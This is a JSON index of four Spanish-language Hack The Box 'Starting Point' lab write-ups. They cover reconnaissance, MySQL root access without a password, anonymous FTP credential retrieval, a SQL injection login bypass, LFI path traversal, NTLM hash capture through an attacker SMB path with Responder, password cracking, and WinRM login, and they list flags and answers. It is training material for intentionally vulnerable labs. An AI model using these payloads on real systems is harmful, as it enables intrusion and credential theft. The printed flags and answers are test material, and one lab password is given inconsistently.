[ { "title": "HTB - Sequel", "url": "/posts/sp-htb-writeup-sequel/", "categories": "Hack The Box, Starting Point", "tags": "Web, Sql, Starting Point - Tier 2", "date": "2022-06-26 00:00:00 +0000", "snippet": "EscaneoRealizamos un escaneo de nmap para identificar los puertos abiertos y servicios.nmap {target ip} -sV -vResultado del escaneo:Initiating NSE at 22:08Completed NSE at 22:08, 0.00s elapsedNmap scan report for 10.129.93.192Host is up (0.43s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION3306/tcp open mysql?|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)| mysql-info: | Protocol: 10| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1| Thread ID: 121| Capabilities flags: 63486| Some Capabilities: IgnoreSigpipes, SupportsTransactions, FoundRows, DontAllowDatabaseTableColumn, SupportsCompression, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, InteractiveClient, ConnectWithDatabase, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments| Status: Autocommit| Salt: Q2A2spXHAK7oKfCZysV6|_ Auth Plugin Name: mysql_native_password|_sslv2: ERROR: Script execution failed (use -d to debug)NSE: Script Post-scanning.Initiating NSE at 22:08Completed NSE at 22:08, 0.00s elapsedInitiating NSE at 22:08Completed NSE at 22:08, 0.00s elapsedInitiating NSE at 22:08Completed NSE at 22:08, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 249.05 secondsSolo hay un puerto abierto corriendo MySQL especificamente 5.5.5-10.3.27-MariaDB-0+deb10u1. Podemos intentar conectarnos al servicio en el puerto 3306 con mysql utilizando el usuario root para que no sea necesario proporcionar una contraseña.mysql -h {target ip} -u root -P 3306Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 129Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt;Mostramos todas las bases de datos disponibles con el siguiente comando:SHOW databases;+--------------------+| Database |+--------------------+| htb || information_schema || mysql || performance_schema |+--------------------+Seleccionamos htb y mostramos todas sus tablas:USE htb;SHOW tables;+---------------+| Tables_in_htb |+---------------+| config || users |+---------------+Tenemos dos tablas: config y users. Estas pueden verificarse secuencialmente por su contenido:SELECT * FROM {nombre de la tabla};Una vez que consultamos el contenido de la tabla de configuración se muestra claramente el valor de la flag. +----+-----------------------+----------------------------------+| id | name | value |+----+-----------------------+----------------------------------+| 1 | timeout | 60s || 2 | security | default || 3 | auto_logon | false || 4 | max_size | 2M || 5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 || 6 | enable_uploads | false || 7 | authentication_method | radius |+----+-----------------------+----------------------------------+Preguntas ¿Qué significa el acrónimo SQL? Structured Query Language Durante nuestro escaneo, ¿qué puerto con mysql encontramos? 3306 ¿Qué versión de MySQL desarrollada por la comunidad está ejecutando el objetivo? MariaDB ¿Qué interruptor necesitamos usar para especificar un nombre de usuario de inicio de sesión para el servicio MySQL? -u ¿Qué nombre de usuario nos permite iniciar sesión en MariaDB sin proporcionar una contraseña? root ¿Qué símbolo podemos usar para especificar dentro de la consulta que queremos mostrar todo dentro de una tabla? \\ ¿Con qué símbolo necesitamos terminar cada consulta? ; Root Flag: 7b4bec00d1a39e3dd4e021ec3d915da8" }, { "title": "HTB - Crocodile", "url": "/posts/sp-htb-writeup-crocodile/", "categories": "Hack The Box, Starting Point", "tags": "Web, Sql, Starting Point - Tier 2", "date": "2022-06-21 00:00:00 +0000", "snippet": "EscaneoRealizamos un escaneo de nmap para identificar los puertos abiertos y servicios.nmap 10.129.79.250 -sC -sV -v-sC: empleamos scripts predeterminados en el escaneoResultado del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 02:02 CDTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.Nmap scan report for 10.129.79.250Host is up (0.42s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.10.16.14| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist|_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Smash - Bootstrap Business Template| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: UnixNSE: Script Post-scanning.Initiating NSE at 02:03Completed NSE at 02:03, 0.00s elapsedInitiating NSE at 02:03Completed NSE at 02:03, 0.00s elapsedInitiating NSE at 02:03Completed NSE at 02:03, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 60.95 secondsExisten 2 puertos abiertos en la máquina objetivo, el puerto 80 corriendo un servidor web Apache y el puerto 21 corriendo un servidor ftp. Primero vamos a visitar el servidor web a través del navegador.Navegando por la página no pude encontrar un formulario, así que vamos a utilizar la herramienta gobuster que utiliza brute-forcing para descubrir directorios y archivos en un servidor web.gobuster -u {target ip} -w /usr/share/wordlists/directory-list-2.3-small.txt -w php -t 100Utilizarémos directory-list-2.3-small.txt para realizar un descubrimiento más rápido y especificaremos que busque además archivos php.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.10.63[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Timeout: 10s===============================================================2022/04/27 03:01:47 Starting gobuster in directory enumeration mode===============================================================/login.php (Status: 200) [Size: 1577]/assets (Status: 301) [Size: 313] [--&gt; http://10.129.10.63/assets/]/css (Status: 301) [Size: 310] [--&gt; http://10.129.10.63/css/] /js (Status: 301) [Size: 309] [--&gt; http://10.129.10.63/js/] /logout.php (Status: 302) [Size: 0] [--&gt; login.php] /config.php (Status: 200) [Size: 0] /fonts (Status: 301) [Size: 312] [--&gt; http://10.129.10.63/fonts/] /dashboard (Status: 301) [Size: 316] [--&gt; http://10.129.10.63/dashboard/]Hemos descubierto un archivo llamado login.php, ahora tenemos un vector de ataque para obtener la bandera.Ganando Acceso (Admin)Podemos intentar una SQL Injection pero gracias al escaneo realizado previamente podemos ver que dentro del servidor ftp hay dos archivos que pueden contener usuarios y sus respectivas contraseñas para iniciar sesión correctamente.Accedemos al servidor ftp de manera anónima, descargamos los archivos y vemos su contenido.ftp {target ip}Connected to 10.129.10.63.220 (vsFTPd 3.0.3)Name (10.129.10.63:epsylon): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||43390|)150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd226 Directory send OK.ftp&gt; get allowed.userlistlocal: allowed.userlist remote: allowed.userlist229 Entering Extended Passive Mode (|||47042|)150 Opening BINARY mode data connection for allowed.userlist (33 bytes).100% |*****************************************************************************| 33 0.20 KiB/s 00:00 ETA226 Transfer complete.33 bytes received in 00:00 (0.04 KiB/s)ftp&gt; get allowed.userlist.passwdlocal: allowed.userlist.passwd remote: allowed.userlist.passwd229 Entering Extended Passive Mode (|||46268|)150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).100% |*****************************************************************************| 62 0.38 KiB/s 00:00 ETA226 Transfer complete.62 bytes received in 00:00 (0.09 KiB/s)Ingresamos el usuario admin y su contraseña rKXM59ESxesUFHAd en el formulario.Preguntas ¿Qué interruptor de escaneo nmap emplea el uso de scripts predeterminados durante un escaneo? -sC ¿Qué versión de servicio se encuentra ejecutándose en el puerto 21? vsftpd 3.0.3 ¿Qué código FTP se nos devuelve para el mensaje “Inicio de sesión FTP anónimo permitido”? 230 ¿Qué comando podemos usar para descargar los archivos que encontramos en el servidor FTP? get ¿Cuál es uno de los nombres de usuario que suenan con mayor privilegio en la lista que recuperamos? admin ¿Qué versión de Apache HTTP Server se está ejecutando en el host de destino? 2.4.41 ¿Cuál es el nombre de un útil complemento de análisis de sitios web que podemos instalar en nuestro navegador? Wappalyzer ¿Qué interruptor podemos usar con gobuster para especificar que estamos buscando tipos de archivo específicos? -x ¿Qué archivo hemos encontrado que pueda proporcionarnos un punto de apoyo en el objetivo? login.php Root Flag: c7110277ac44d78b6a9fff2232434d16" }, { "title": "HTB - Appointment", "url": "/posts/sp-htb-writeup-appointment/", "categories": "Hack The Box, Starting Point", "tags": "Web, Sql, Starting Point - Tier 2", "date": "2022-06-21 00:00:00 +0000", "snippet": "EscaneoRealizamos un escaneo de nmap para identificar los puertos abiertos y servicios.nmap {target ip} -sV -v -OResultado del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 20:09 CDTNSE: Loaded 45 scripts for scanning.Initiating Ping Scan at 20:09Scanning 10.129.8.143 [4 ports]Completed Ping Scan at 20:09, 0.19s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 20:09Completed Parallel DNS resolution of 1 host. at 20:09, 0.00s elapsedInitiating SYN Stealth Scan at 20:09Scanning 10.129.8.143 [1000 ports]Discovered open port 80/tcp on 10.129.8.143Completed SYN Stealth Scan at 20:09, 2.96s elapsed (1000 total ports)Initiating Service scan at 20:09Scanning 1 service on 10.129.8.143Completed Service scan at 20:09, 6.35s elapsed (1 service on 1 host)Initiating OS detection (try #1) against 10.129.8.143Retrying OS detection (try #2) against 10.129.8.143Retrying OS detection (try #3) against 10.129.8.143Retrying OS detection (try #4) against 10.129.8.143Retrying OS detection (try #5) against 10.129.8.143NSE: Script scanning 10.129.8.143.Initiating NSE at 20:09Completed NSE at 20:10, 1.49s elapsedInitiating NSE at 20:10Completed NSE at 20:10, 1.56s elapsedNmap scan report for 10.129.8.143Host is up (0.40s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.38 ((Debian))No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=4/26%OT=80%CT=1%CU=37959%PV=Y%DS=2%DC=I%G=Y%TM=626897EOS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECNOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Uptime guess: 47.250 days (since Thu Mar 10 13:10:18 2022)Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosRead data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.88 seconds Raw packets sent: 1220 (57.946KB) | Rcvd: 1164 (52.452KB)Podemos observar que existe un servidor Apache corriendo en el puerto 80 lo que quiere decir que hay una página web activa en esa máquina.Intentamos una SQL Injection básica para acceder al sistema como administrador sin necesidad de una contraseña.' or 1=1#Obtenemos la bandera.Preguntas ¿Qué significa el acrónimo SQL? Structured Query Language ¿Cuál es uno de los tipos más comunes de vulnerabilidades de SQL? SQL Injection ¿Qué significa PII? Personally Identifiable Information ¿Cuál es el nombre de la lista OWASP Top 10 para la clasificación de esta vulnerabilidad? A03:2021-Injection ¿Qué servicio y versión se ejecutan en el puerto 80 del destino? Apache httpd 2.4.38 ((Debian)) ¿Cuál es el puerto estándar utilizado para el protocolo HTTPS? 443 ¿Cuál es un método basado en la suerte para explotar las páginas de inicio de sesión? Brute-Forcing ¿Cómo se llama una carpeta en la terminología de aplicaciones web? Directory ¿Qué código de respuesta se da para los errores “No encontrado”? 404 ¿Qué interruptor usamos con Gobuster para especificar que buscamos descubrir directorios y no subdominios? dir ¿Qué símbolo usamos para comentar partes del código? # Root Flag: e3d0796d002a446c0e622226f42e9672" }, { "title": "HTB - Responder", "url": "/posts/sp-htb-writeup-responder/", "categories": "Hack The Box, Starting Point", "tags": "Web, Responder, LFI", "date": "2022-06-19 03:30:00 +0000", "snippet": "EscaneoRealizamos un escaneo de nmap para identificar los puertos abiertos y servicios.nmap -v -p- --min-rate 5000 -sV -sC {target ip}Resultado del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 15:41 CDTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.Nmap scan report for 10.129.39.225Host is up (0.18s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.15985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.07680/tcp open pando-pub?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsNSE: Script Post-scanning.Initiating NSE at 15:43Completed NSE at 15:43, 0.00s elapsedInitiating NSE at 15:43Completed NSE at 15:43, 0.00s elapsedInitiating NSE at 15:43Completed NSE at 15:43, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 126.94 secondsVisitamos el servidor web corriendo en el puerto 80 mediante el navegador web.Nos redirige a una pagina web llamada unika.htb. Debido a que nos encontramos dentro de la misma red que la máquina objetivo y que ese dominio no esta registrado en un servidor DNS, procedemos a agregar la ip y el nombre de dominio al archivo /etc/hosts para poder visualizar la pagina web.Ahora ya podemos visualizarla.Navegando por la página nos encontramos con un apartado para cambiar el idioma, si nos fijamos en la url se ve como se incluye un archivo llamado french.html mediante otro archvio llamado index.php.Vamos a pasarle al parámetro “page” la siguiente cadena para saber si es vulnerable a LFI y como consecuencia a path traversal.../../. ./../../../../../windows/system32/drivers/etc/hostsComo podemos ver existe una vulnerabilidad en esta web.Ganando Acceso (Admin)Regresando al escaneo, el puerto 5985 se encuentra abierto lo que quiere decir que WinRM esta disponible. Podemos aprovecharnos del LFI de la página web para capturar el hash NTLM de la máquina con ayuda de la herramienta responder.Vamos a ejecutar la herramienta con el siguente comando.sudo responder -I tun0 tun0 es la interfaz de red de nuestra máquinaVerificamos que el servidor SMB este activado.Mientras responder esta esperando una conexion, nos dirigimos a la URL de la página web e ingresamos la siguiente cadena en el parámetro page.//{our machine ip}/somefileEsto para que la página incluya un “recurso” de nuestro servidor SMB y se establezca una conexión.Vemos en la terminal que se ha capturado el hash NTLM.Guardamos el hash en un archivo de texto y lo desciframos con ayuda de la herramienta John The Ripper .john -w=/usr/share/wordlists/rockyou.txt hash.txtA continuación utilizamos la herramienta evilwinrm para autenticarnos en el sistema con las credenciales obtenidas.evil-winrm -i {target ip} -u administrator -p badmintonAhora solo queda buscar el archivo flag.txt. Este se encuentra en la ruta C:\\Users\\mike\\Desktop.Preguntas ¿Cuántos puertos TCP están abiertos en la máquina? 3 Al visitar el servicio web utilizando la dirección IP, ¿cuál es el dominio al que se nos redirige? unika.htb ¿Qué lenguaje de secuencias de comandos se utiliza en el servidor para generar páginas web? php ¿Cuál es el nombre del parámetro de URL que se usa para cargar diferentes versiones de idioma de la página web? page ¿Cuál de los siguientes valores para el parámetro page sería un ejemplo de explotación de una vulnerabilidad de inclusión de archivo local (LFI): “french.html”, “//10.10.14.6/somefile”, “../../. ./../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe” ../../. ./../../../../../windows/system32/drivers/etc/hosts ¿Qué significa NTLM? New Technology LAN Manager ¿Qué indicador usamos en la utilidad Responder para especificar la interfaz de red? -I Hay varias herramientas que aceptan un desafío/respuesta de NetNTLMv2 y prueban millones de contraseñas para ver si alguna de ellas genera la misma respuesta. A una de estas herramientas se la suele denominar john, pero el nombre completo es ¿cuál?. John The Ripper ¿Cuál es la contraseña para el usuario administrador? batminton Usaremos un servicio de Windows (es decir, que se ejecuta en la caja) para acceder de forma remota a la máquina Responder usando la contraseña que recuperamos. ¿En qué puerto TCP escucha? 5985 Root Flag: ea81b7afddd03efaa0945333ed147fac" } ]
